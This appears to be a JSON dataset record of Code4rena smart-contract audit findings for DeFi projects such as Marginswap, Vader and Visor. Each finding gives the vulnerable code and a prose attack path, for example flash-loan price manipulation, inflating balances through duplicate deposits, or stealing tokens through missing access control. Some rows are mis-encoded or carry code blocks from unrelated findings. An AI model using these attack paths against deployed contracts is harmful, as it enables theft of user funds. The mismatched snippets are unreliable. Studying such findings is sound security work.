{
  "doc-656deeb88abe086885ef205c8e023abe": {
    "status": "processed",
    "chunks_count": 121,
    "content": "[\n  {\n    \"row_number\": 2,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Price feed can be manipulated\\\"\",\n    \"line\": \"PriceAware[60,111,144]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-marginswap#h-03-price-feed-can-be-manipulated\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Anyone can trigger an update to the price feed by callingPriceAware.getCurrentPriceInPeg(token, inAmount, forceCurBlock=true).\\nIf the update window has passed, the price will be computed by simulating a Uniswap-like trade with the amounts.\\nThis simulation uses the reserves of the Uniswap pairs which can be changed drastically using flash loans to yield almost arbitrary output amounts, and thus prices. Wrong prices break the core functionality of the contracts such as borrowing on margin, liquidations, etc.\",\n      \"Recommend against using the Uniswap spot price as the real price. Uniswap itself warns against this and instead recommends implementing aTWAP price oracleusing theprice*CumulativeLastvariables.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 3,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Inconsistent usage of applyInterest\\\"\",\n    \"line\": \"BaseLending[31], HourlyBondSubscriptionLending[68,97], Lending[163,185]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-marginswap#h-04-inconsistent-usage-of-applyinterest\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"It is unclear if the functionapplyInterestis supposed to return a new balance with the interest applied or only the accrued interest? There are various usages of it, some calls add the return value to the old amount:\",\n      \"This makes the code misbehave and return the wrong values for the balance and accrued interest.\",\n      \"Recommend making it consistent in all cases when calling this function.\"\n    ],\n    \"code_blocks\": [\n      \"return\\nbond\\n.\\namount\\n+\\napplyInterest\\n(\\nbond\\n.\\namount\\n,\\ncumulativeYield\\n,\\nyieldQuotientFP\\n);\\nand\\nsome\\nnot:\\nbalanceWithInterest\\n=\\napplyInterest\\n(\\nbalance\\n,\\nyA\\n.\\naccumulatorFP\\n,\\nyieldQuotientFP\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 4,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong liquidation logic\\\"\",\n    \"line\": \"CrossMarginAccounts[194], IsolatedMarginAccounts[80]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-marginswap#h-05-wrong-liquidation-logic\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"ThebelowMaintenanceThresholdfunction decides if a trader can be liquidated:\",\n      \"The inequality in the last equation is wrong because it says the higher the holdings (margin + loan) compared to the loan, the higher the chance of being liquidated. The inverse equality was probably intendedreturn 100 * holdings <= liquidationThresholdPercent * loan;. Users that shouldn‚Äôt be liquidated can be liquidated, and users that should be liquidated cannot get liquidated.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nbelowMaintenanceThreshold\\n(\\nCrossMarginAccount\\nstorage\\naccount\\n)\\ninternal\\nreturns\\n(\\nbool\\n)\\n{\\nuint256\\nloan\\n=\\nloanInPeg\\n(\\naccount\\n,\\ntrue\\n);\\nuint256\\nholdings\\n=\\nholdingsInPeg\\n(\\naccount\\n,\\ntrue\\n);\\n// The following should hold:\\n// holdings / loan >= 1.1\\n// =>\\nreturn\\n100\\n*\\nholdings\\n>=\\nliquidationThresholdPercent\\n*\\nloan\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 5,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"account.holdsToken is never set\\\"\",\n    \"line\": \"CrossMarginAccounts[58]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-marginswap#h-07-accountholdstoken-is-never-set\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"TheaddHoldingfunction does not update theaccount.holdsTokenmap.\",\n      \"This leads to a critical vulnerability where deposits of the same token keep being pushed to theaccount.holdingTokensarray but the sum is correctly updated inaccount.holdings[token]. However, because of the duplicate token in theholdingTokensarray the same token is counted several times in thegetHoldingAmountsfunction:\",\n      \"TheMarginRouter.crossCloseAccountfunction uses these wrong amounts to withdraw all tokens:\",\n      \"An attacker can just deposit the same token X times which increases their balance by X times the actual value.\\nThis inflated balance can then be withdrawn to steal all tokens.\",\n      \"Recommend correctly setting theaccount.holdsTokenmap inaddHolding.\"\n    ],\n    \"code_blocks\": [\n      \"function\\naddHolding\\n(\\nCrossMarginAccount\\nstorage\\naccount\\n,\\naddress\\ntoken\\n,\\nuint256\\ndepositAmount\\n)\\ninternal\\n{\\nif\\n(!\\nhasHoldingToken\\n(\\naccount\\n,\\ntoken\\n)) {\\n// SHOULD SET account.holdsToken here\\naccount\\n.\\nholdingTokens\\n.\\npush\\n(\\ntoken\\n);\\n}\\naccount\\n.\\nholdings\\n[\\ntoken\\n] +=\\ndepositAmount\\n;\\n}\",\n      \"function\\ngetHoldingAmounts\\n(\\naddress\\ntrader\\n)\\nexternal\\nview\\noverride\\nreturns\\n(\\naddress\\n[]\\nmemory\\nholdingTokens\\n,\\nuint256\\n[]\\nmemory\\nholdingAmounts\\n)\\n{\\nCrossMarginAccount\\nstorage\\naccount\\n=\\nmarginAccounts\\n[\\ntrader\\n];\\nholdingTokens\\n=\\naccount\\n.\\nholdingTokens\\n;\\nholdingAmounts\\n=\\nnew\\nuint256\\n[](\\naccount\\n.\\nholdingTokens\\n.\\nlength\\n);\\nfor\\n(\\nuint256\\nidx\\n=\\n0\\n;\\nholdingTokens\\n.\\nlength\\n>\\nidx\\n;\\nidx\\n++) {\\naddress\\ntokenAddress\\n=\\nholdingTokens\\n[\\nidx\\n];\\n// RETURNS SUM OF THE BALANCE FOR EACH TOKEN ENTRY\\nholdingAmounts\\n[\\nidx\\n] =\\naccount\\n.\\nholdings\\n[\\ntokenAddress\\n];\\n}\\n}\",\n      \"function\\ncrossCloseAccount\\n()\\nexternal\\n{\\n(\\naddress\\n[]\\nmemory\\nholdingTokens\\n,\\nuint256\\n[]\\nmemory\\nholdingAmounts\\n) =\\nIMarginTrading\\n(\\nmarginTrading\\n()).\\ngetHoldingAmounts\\n(\\nmsg\\n.\\nsender\\n);\\n// requires all debts paid off\\nIMarginTrading\\n(\\nmarginTrading\\n()).\\nregisterLiquidation\\n(\\nmsg\\n.\\nsender\\n);\\nfor\\n(\\nuint256\\ni\\n;\\nholdingTokens\\n.\\nlength\\n>\\ni\\n;\\ni\\n++) {\\nFund\\n(\\nfund\\n()).\\nwithdraw\\n(\\nholdingTokens\\n[\\ni\\n],\\nmsg\\n.\\nsender\\n,\\nholdingAmounts\\n[\\ni\\n]\\n);\\n}\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 6,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong calcAsymmetricShare calculation\\\"\",\n    \"line\": \"Utils[266]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-07-wrong-calcasymmetricshare-calculation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"The inline-comment defines the number of asymmetric shares as(u * U * (2 * A^2 - 2 * U * u + U^2))/U^3but theUtils.calcAsymmetricSharefunction computes(uA * 2U^2 - 2uU + u^2) / U^3which is not equivalent as can be seen from theA^2term in the first term which does not occur in the second one.\",\n      \"The associativity onP * part1is wrong, andpart2is not multiplied byP.\",\n      \"The math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as the asymmetric share (which is used to determine the collateral value in base tokens) could be wrong. For example, it might be possible to borrow more than the collateral put up.\",\n      \"Recommend clarifying if the comment or the code is correct and fix them if not.\",\n      \"strictly-scarce (vader) confirmed:\",\n      \"strictly-scarce (vader) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Valid\",\n      \"Whilst the math is incorrect, in the current implementation it is not yet implemented, so disagree with Severity (funds not lost), recommend: 2\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 7,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Wrong liquidity units calculation\\\"\",\n    \"line\": \"Utils[229]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-08-wrong-liquidity-units-calculation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"The spec defines the number of LP units to be minted asunits = (P (a B + A b))/(2 A B) * slipAdjustment = P * (part1 + part2) / part3 * slipAdjustmentsbut theUtils.calcLiquidityUnitsfunction computes((P * part1) + part2) / part3 * slipAdjustments.\",\n      \"The associativity onP * part1is wrong, andpart2is not multiplied byP.\",\n      \"The math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as redeeming the minted LP tokens does not result in the initial tokens anymore.\",\n      \"Recommend fixing the equation.\",\n      \"strictly-scarce (vader) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"Valid, but funds not at risk.\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 8,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone can list anchors / curate tokens\\\"\",\n    \"line\": \"Pools[54,59], Router[245,254]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-10-anyone-can-list-anchors--curate-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"TheRouter.listAnchorfunction can be called by anyone and tokens can be added. The only check is thatrequire(iPOOLS(POOLS).isAnchor(token));but this can easily be set by callingPools.addLiquidity(VADER, token, _)once even without actually sending any tokens to the contract. This makes it an essentially useless check.\",\n      \"This only works initially as long as theanchorLimithas not been reached yet.\\nHowever, thereplaceAnchorcan be used in the same way and flash loans can be used to get around the liquidity restrictions and push another anchor token out of the price range as these checks use the current reserves.\",\n      \"Anchored pools are automatically curated pools and determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.\",\n      \"After a pool has been anchored through flash loans, liquidity can be withdrawn which could make the anchor price easy to manipulate in the next block and launch other attacks.\",\n      \"Recommend revisiting the_isAnchor[token] = true;statement inaddLiquidity, it seems strange without any further checks.\\nConsider makinglistAnchor/replaceAnchorDAO-only functions and make them flash-loan secure.\\nOne should probably use time-weighted prices for these pools for the bounds check.\",\n      \"strictly-scarce (vader) disputed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"The protocol is intended to be launched with 5 anchors so it can only be attacked by usingreplaceAnchor(), in which case slip-based fees apply for attacks and thwart the attack path.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 9,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Swap token can be traded as fake base token\\\"\",\n    \"line\": \"Pools[101,103,111]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-11-swap-token-can-be-traded-as-fake-base-token\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"ThePools.swapfunction does not check ifbaseis one of the base tokens. One can transfertokens to the pool and setbase=tokenand callswap(token, token, member, toBase=false)\",\n      \"The_actualInput = getAddedAmount(base, token);will return thetokenamount added but use the ratio compared to thebasereservecalcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmountwhich yields a wrong swap result.\",\n      \"It breaks the accounting for the pool astokens are transferred in, but thebasebalance is increased (andtokenbalance decreased). LPs cannot correctly withdraw again, and others cannot correctly swap again.\",\n      \"Another example scenario is that the token pool amount can be stolen.\\nSendtokenIn=baseAmountof tokens to the pool and callswap(base=token, token, member, toBase=false). Depending on the price oftokenrelative tobasethis could be cheaper than trading with the base tokens.\",\n      \"Recommend checking thatbaseis eitherUSDVorVADER.\",\n      \"strictly-scarce (vader) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"Valid, funds can be lost\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 10,\n    \"bug_id\": \" H-12\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"getAddedAmount can return wrong results\\\"\",\n    \"line\": \"Pools[192]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-12-getaddedamount-can-return-wrong-results\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"ThegetAddedAmountfunction only works correctly when called with(VADER/USDV, pool)or(pool, pool).\\nHowever, when called with (token, pool)wheretokenis neitherVADER/USDV/pool, it returns the wrong results:\",\n      \"It gets thetokenbalance\",\n      \"And subtracts it from the storedmapToken_tokenAmount[_pool]amount which can be that of a completely different token\",\n      \"Anyone can break individual pairs by callingsync(token1, token2)where thetoken1balance is less thanmapToken_tokenAmount[token2]. This will add the difference tomapToken_tokenAmount[token2]and break the accounting and result in a wrong swap logic.\",\n      \"Furthermore, this can also be used to swap tokens without having to pay anthing withswap(token1, token2, member, toBase=false).\",\n      \"Recommend adding a require statement in theelsebranch that checks that_token == _pool.\",\n      \"strictly-scarce (vader) confirmed:\",\n      \"strictly-scarce (vader) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Valid, funds can be lost\",\n      \"Would bundle this issue with:https://github.com/code-423n4/2021-04-vader-findings/issues/205\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 11,\n    \"bug_id\": \" H-13\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"4 Synths can be minted with fake base token\\\"\",\n    \"line\": \"Pools[103,143,145]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-13-4-synths-can-be-minted-with-fake-base-token\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"ThePools.mintSynthfunction does not check ifbaseis one of the base tokens. One can transfertokens to the pool and setbase=tokenand callmintSynth(token, token, member).\",\n      \"The_actualInput = getAddedAmount(base, token);will return thetokenamount added but use the ratio compared to thebasereservecalcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmountwhich yields a wrong swap result.\",\n      \"It breaks the accounting for the pool astokens are transferred in, but thebasebalance is increased.\",\n      \"The amount that is minted could also be inflated (cheaper than sending the actual base tokens), especially iftokenis a high-precision token or worth less than base.\",\n      \"Recommend checking thatbaseis eitherUSDVorVADERinmintSynth.\",\n      \"strictly-scarce (vader) confirmed:\",\n      \"strictly-scarce (vader) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Valid, funds can be lost.\",\n      \"would bundle this issue with:https://github.com/code-423n4/2021-04-vader-findings/issues/205\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 12,\n    \"bug_id\": \" H-14\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Missing access restriction on lockUnits/unlockUnits\\\"\",\n    \"line\": \"Pools[179]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-14-missing-access-restriction-on-lockunitsunlockunits\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"ThePool.lockUnitsallows anyone to steal pool tokens from amemberand assign them tomsg.sender. Anyone can steal pool tokens from any other user.\",\n      \"Recommend adding access control and require thatmsg.senderis the router or another authorized party.\",\n      \"strictly-scarce (vader) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Valid, although this is part of the partially-complete lending code.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 13,\n    \"bug_id\": \" H-15\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Wrong slippage protection on Token -> Token trades\\\"\",\n    \"line\": \"Router[133,156]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-15-wrong-slippage-protection-on-token---token-trades\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"TheRouter.swapWithSynthsWithLimitallows trading token to token and specifying slippage protection. A token to token trade consists of two trades:\",\n      \"token to base\",\n      \"base to token\",\n      \"The slippage protection of the second trade (base to token) is computed wrong:\",\n      \"It compares thetokeninput amount (of the first trade) to thebasereserve of the second pair.\",\n      \"Slippage protection fails and either the trade is cancelled when it shouldn‚Äôt be or it is accepted even though the user suffered more losses than expected.\",\n      \"Recommend it should use the base output from the first trade to check for slippage protection. Note that this still just computes the slippage protection of each trade individually. An even better way would be to come up with a formula to compute the slippage on the two trades at once.\",\n      \"strictly-scarce (vader) confirmed:\",\n      \"Mervyn853 commented:\"\n    ],\n    \"code_blocks\": [\n      \"require\\n(\\niUTILS\\n(\\nUTILS\\n()).\\ncalcSwapSlip\\n(\\ninputAmount\\n,\\n// should use outToken here from prev trade\\niPOOLS\\n(\\nPOOLS\\n).\\ngetBaseAmount\\n(\\noutputToken\\n)\\n) <=\\nslipLimit\\n);\"\n    ],\n    \"quotes\": [\n      \"Valid, although disagree with severity, the wrongly compute slip amount would just fail the trade or allow the second trade to go thru with no protection.\",\n      \"Our decision matrix for severity:0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\\n1: Low Risk: UX, state handling, function incorrect as to spec\\n2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\\n3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.Recommended: 1\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 14,\n    \"bug_id\": \" H-21\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone Can Avoid All Vether Transfer Fees By Adding Their Address to the Vether ExcludedAddresses List.\\\"\",\n    \"line\": \"Vether[93]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-21-anyone-can-avoid-all-vether-transfer-fees-by-adding-their-address-to-the-vether-excludedaddresses-list\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Vether.solimplements a fee on every token transfer, unless either the sender or the recipient exists on a list of excluded addresses(mapAddress_Excluded). However, theaddExcluded()function inVether.solhas no restrictions on who can call it.\\nSo any user can calladdExcludedwith their own address as the argument, and bypass all transfer fees.\",\n      \"Alice calls:\",\n      \"(1)Vether.addExcluded(aliceAddress), which adds Alice‚Äôs address tomapAddress_Excluded.\\n(2) Alice can now freely transfer Vether with no fees.\",\n      \"Recommend adding restrictions to who can calladdExcluded, perhaps by restricting it to a caller set byDAO.sol\",\n      \"strictly-scarce (vader) commented:\",\n      \"dmvt (judge) commented:\",\n      \"moneylegobatman (C4 Editor) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Vether contract is outside of contest\",\n      \"https://github.com/code-423n4/2021-04-vader-findings/issues/3#issuecomment-849043144The warden should be paid out on this issue, in my opinion, because the code was included in the repo to be reviewed. The work to review the contract was done despite the fact that the team has addressed the issue and has already deployedvether.sol. I do not think that any issues related toVether.solshould be included in the final report generated by @code423n4.It was unclear to me (and obviously most of the wardens) thatVether.solwas considered out of scope.\",\n      \"Leaving report and discussion in for transparency, since finding was awarded.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 15,\n    \"bug_id\": \" H-23\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone can curate pools and steal rewards\\\"\",\n    \"line\": \"Router[224,234]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-vader#h-23-anyone-can-curate-pools-and-steal-rewards\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"TheRouter.curatePoolandreplacePooldon‚Äôt have any access restriction.\\nAn attacker can get a flash loan of base tokens and replace existing curated pools with their own curated pools.\",\n      \"Curated pools determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.\\nThey can then go ahead and game the reward system by repeatedly swapping in their custom pool with useless tokens, withdraw liquidity, and in the end, pay back the base flashloan.\",\n      \"Recommend preventing the replacing of curations through flash loans. Also, consider making pool curations DAO-exclusive actions.\",\n      \"strictly-scarce (vader) disputed:\",\n      \"dmvt (judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Slip-based pools cannot be attacked with flash loans.\",\n      \"Further comment from @cmichelio:I can curate my custom token usingcuratePoolwithout using a flashloan or using replacePool by temporarily providing liquidity to the pool without trading in it and getting slip-fee‚Äôd. I‚Äôm not trading in the pool, and don‚Äôt think providing/removing liquidity comes with a fee. I think this is still an issue.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 16,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"getRandomTokenIdFromFund yields wrong probabilities for ERC1155\\\"\",\n    \"line\": \"NFTXVaultUpgradeable[413]\",\n    \"url\": \" https://code4rena.com/reports/2021-05-nftx#h-03-getrandomtokenidfromfund-yields-wrong-probabilities-for-erc1155\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"NFTXVaultUpgradeable.getRandomTokenIdFromFunddoes not work with ERC1155 as it does not take the depositedquantity1155into account.\",\n      \"AssumetokenId0has a count of 100, andtokenId1has a count of 1.\\nThengetRandomIdwould have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\",\n      \"This might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\",\n      \"Recommend taking the quantities of each token into account (quantity1155) which probably requires a design change as it is currently hard to do without iterating over all tokens.\",\n      \"0xKiwi (NFTX) acknowledged\",\n      \"cemozer (Judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Marking this as high risk as an attacker can weed out high-value NFTs from a vault putting other users funds at risk\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 17,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"NFT transfer approvals are not removed and cannot be revoked thus leading to loss of NFT tokens\\\"\",\n    \"line\": \"Visor[481]\",\n    \"url\": \" https://code4rena.com/reports/2021-05-visorfinance#h-02-nft-transfer-approvals-are-not-removed-and-cannot-be-revoked-thus-leading-to-loss-of-nft-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xRajeev, also found by shw\",\n      \"NFT transfer approvals that are set to true inapproveTransferERC721()are never set to false and there is no way to remove such an nft approval.\",\n      \"Impact 1: The approval is not removed (set to false) after a transfer intransferERC721(). So if the NFT is ever moved back into the owner‚Äôs vault again, then the previous/compromised delegate can again transfer it to any address of choice without requiring a new approval.\",\n      \"Impact 2: If a delegate becomes compromised/untrustworthy after granting approval but before transfer then the owner will lose its NFT because there is no mechanism to revoke the approval that was granted earlier.\",\n      \"PoC-1:\",\n      \"Alice grants Eve approval to transfer a particular NFT out of its vault usingapproveTransferERC721()\",\n      \"Eve, who has transfer rights to that NFT from Alice‚Äôs vault,  transfers that NFT to Bob usingtransferERC721()\",\n      \"Alice decides to buy back that NFT (e.g. because it is now considered rare and more valuable) from Bob and transfers it back to its vault\",\n      \"Eve, who continues to have transfer rights to that NFT from Alice‚Äôs vault, can steal that NFT and transfer to anyone\",\n      \"PoC-2:\",\n      \"Alice grants Eve approval to transfer a particular NFT out of its vault usingapproveTransferERC721()\",\n      \"Alice learns that Eve‚Äôs keys are compromises or that Eve is malicious and wants to revoke the approval but there is no mechanism to do so\",\n      \"Eve (or whoever stole her credentials) has transfer rights to that NFT from Alice‚Äôs vault and can steal that NFT and transfer to anyone\",\n      \"Recommend adding a boolean parameter toapproveTransferERC721()and set thenftApprovalsto that parameter which can be true for giving approval and false for removing/revoking approval\\nIfmsg.sender != _getOwner(), callapproveTransferERC721()with the boolean false to remove approval before making a transfer intransferERC721()on L515.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"duplicatehttps://github.com/code-423n4/2021-05-visorfinance-findings/issues/35\",\n      \"35 is about token being stuck in the vault. This issue is about not being able to revoke approval. Marking this as separate.\",\n      \"patchlink\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 18,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Approval for NFT transfers is not removed after transfer\\\"\",\n    \"line\": \"Visor[495]\",\n    \"url\": \" https://code4rena.com/reports/2021-05-visorfinance#h-03-approval-for-nft-transfers-is-not-removed-after-transfer\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by gpersoon, and pauliax\",\n      \"TheVisor.transferERC721does not reset the approval for the NFT.\",\n      \"An approved delegatee can move the NFT out of the contract once.\\nIt could be moved to a market and bought by someone else who then deposits it again to the same vault.\\nThe first delegatee can steal the NFT and move it out of the contract a second time.\",\n      \"Recommend resetting the approval on transfer.\",\n      \"xyz-ctrl (Visor) confirmed:\",\n      \"ztcrypto (Visor) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"We will be mitigating this issue for our next release and before these experimental features are introduced in platform.\\nPR pending\",\n      \"duplicate of above ones and fixed\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 19,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"YieldMath.sol / Log2: >= or > ?\\\"\",\n    \"line\": \"YieldMath[41]\",\n    \"url\": \" https://code4rena.com/reports/2021-05-yield#h-03-yieldmathsol--log2--or--\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"The V1 version ofYieldMath.solcontains ‚Äù>=‚Äù (larger or equal), while the V2 version ofYieldMath.solcontains ‚Äù>‚Äù (larger) in the log_2 function.\\nThis change doesn‚Äôt seem logical and might lead to miss calculations.\\nThe difference is present in several adjacent lines.\",\n      \"and\",\n      \"Recommend checking which version is the correct version and fix the incorrect version.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nlog_2\\n(\\nuint128\\nx\\n)\\n...\\nb\\n=\\nb\\n*\\nb\\n>> 127;\\nif\\n(\\nb\\n>=\\n0x100000000000000000000000000000000\\n) {\\nb\\n>>=\\n1\\n;\\nl\\n|=\\n0x1000000000000000000000000000000\\n;}\",\n      \"function\\nlog_2\\n(\\nuint128\\nx\\n)\\n...\\nb\\n=\\nb\\n*\\nb\\n>> 127;\\nif\\n(\\nb\\n>\\n0x100000000000000000000000000000000\\n) {\\nb\\n>>=\\n1\\n;\\nl\\n|=\\n0x1000000000000000000000000000000\\n;}\",\n      \"Join\\njoin\\n=\\nnew\\nJoin\\n{\\nsalt\\n:\\nkeccak256\\n(\\nabi\\n.\\nencodePacked\\n(\\nasset\\n))}();\",\n      \"modifier\\nauth\\n(\\nbytes4\\nfs\\n) {\\nrequire\\n(\\nmsg\\n.\\nsig\\n==\\nfs\\n,\\n\\\"Wrong selector\\\"\\n);\\nrequire\\n(\\n_hasRole\\n(\\nmsg\\n.\\nsig\\n,\\nmsg\\n.\\nsender\\n),\\n\\\"Access denied\\\"\\n);\\n_\\n;\\n}\",\n      \"function\\nsetFee\\n(\\nuint256\\n)\\npublic\\nauth\\n(this.setFee.selector) {\\n.....\\n}\",\n      \"function\\n_update\\n(\\nuint128\\nbaseBalance\\n,\\nuint128\\nfyBalance\\n,\\nuint112\\n_baseCached\\n,\\nuint112\\n_fyTokenCached\\n)\\nprivate\\n{\\n....\\ncumulativeBalancesRatio\\n+=\\n(\\nscaledFYTokenCached\\n/\\n_baseCached\\n) *\\ntimeElapsed\\n;\\n....\\n}\",\n      \"a\\n= (\\nb\\n/\\nd\\n)*\\nc\\n0\\n= (\\n5\\n/\\n10\\n)*\\n2\\na\\n= (\\nb\\n*\\nc\\n)/\\n2\\n1\\n= (\\n5\\n*\\n2\\n)/\\n10\",\n      \"// Ladle._close calling it with art or ink as type(int128).min will crash\\nuint128\\namt\\n=\\n_debtInBase\\n(\\nvault\\n.\\nseriesId\\n,\\nseries\\n,\\nuint128\\n(-\\nart\\n));\\nilkJoin\\n.\\nexit\\n(\\nto\\n,\\nuint128\\n(-\\nink\\n))\\n// explanation\\nint128\\nart\\n=\\ntype\\n(\\nint128\\n).\\nmin\\n;\\n// -2^127\\nuint128\\namt\\n=\\nuint128\\n(-\\nart\\n);\\n// this fails as -art=--2^127=2^127 cannot be represented in int128\",\n      \"require ```(ilks[seriesId][ilkId] == true, \\\"Ilk not added to series\\\")```\",\n      \"solidity\\nprice = term1.wmul(term2); // this is the art price in terms of ink now, instead of ink price\\nink = uint256(art).wmulup(price); // can just multiply by art price\"\n    ],\n    \"quotes\": [\n      